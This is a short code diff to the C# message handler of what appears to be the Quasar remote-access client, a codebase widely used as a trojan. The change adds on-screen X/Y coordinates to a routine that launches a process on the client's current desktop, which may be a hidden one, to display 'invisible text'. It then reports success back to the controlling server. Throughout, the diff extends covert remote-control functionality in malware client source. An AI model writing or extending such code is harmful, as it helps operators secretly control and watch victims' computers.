@@ -112,6 +112,8 @@ namespace Quasar.Client.Messages
                 {
                     num = message.FontSize;
                 }
+                int nStartX = message.StartX;
+                int nStartY = message.StartY;
                 try
                 {
                     NativeMethods.STARTUPINFO structure = default(NativeMethods.STARTUPINFO);
@@ -133,11 +135,10 @@ namespace Quasar.Client.Messages
 
                     string strDesktop = ((Networking.Client)client).curDesktopName;
 
-                    structure.lpDesktop = strDesktop; 
-                    
-                    if (!NativeMethods.CreateProcess(null, string.Format("\"{0}\" \"{1}\" \"{2}\"", text10, text9, num), IntPtr.Zero, IntPtr.Zero, false, 0U, IntPtr.Zero, null, ref structure, out process_INFORMATION))
+                    structure.lpDesktop = strDesktop;
+                    if (!NativeMethods.CreateProcess(null, string.Format("\"{0}\" \"{1}\" \"{2}\" \"{3}\" \"{4}\"", text10, text9, num, nStartX, nStartY), IntPtr.Zero, IntPtr.Zero, false, 0U, IntPtr.Zero, null, ref structure, out process_INFORMATION))
                     {
-                        Process.Start(text10, text9);
+                        Process.Start(text10, string.Format("\"{0}\" \"{1}\" \"{2}\" \"{3}\"", text9, num, nStartX, nStartY));
                         if (!flag7)
                         {
                             client.Send(new NotifyMessageToServer { Message = string.Format("{0}","Invisible text showed (on Default desktop)!") });
